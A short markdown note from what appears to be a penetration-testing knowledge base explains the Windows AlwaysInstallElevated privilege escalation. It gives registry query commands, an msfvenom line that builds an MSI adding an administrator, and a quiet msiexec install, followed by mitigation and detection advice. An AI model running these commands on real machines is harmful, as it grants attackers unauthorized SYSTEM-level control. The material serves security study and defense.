---
topic: AlwaysInstallElevated
tags: [windows, privesc, msi, registry, gpo]
---

# AlwaysInstallElevated

[🌐 Español](alwaysinstallelevated.md) | **English**

## Concept

The `AlwaysInstallElevated` policy lets any user install MSI packages with SYSTEM privileges. If both keys (HKLM and HKCU) are `1`, a malicious MSI runs elevated without credentials.

## When it applies

- Workstations with free software installation.
- A GPO enabling the policy for both user and machine.
- A standard user able to run `msiexec`.

## Procedure

1. Query both keys.
2. Build an MSI that adds an administrator or a shell.
3. Install with `msiexec /quiet`.
4. Verify the context.

```bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/adduser USER=<USER> PASS=<PASSWORD> -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

## Variants

- MSI with a `CustomAction` launching a binary.
- `InstallExecuteSequence` to run as SYSTEM.
- Combined with `SeImpersonate` when the policy is off.

## Limitations

- Only works when both keys are `1`.
- AppLocker/WDAC may restrict `msiexec`.
- The MSI must be accepted by the installer.

## Mitigation and detection

- Disable `AlwaysInstallElevated` in both branches.
- Restrict installations to administrators.
- Alert on `msiexec` run by standard users and MSI files under user paths.
- Audit GPO changes.

## References

- <https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated>
- <https://gtfobins.github.io/gtfobins/msiexec/>
- <https://attack.mitre.org/techniques/T1548/002/>
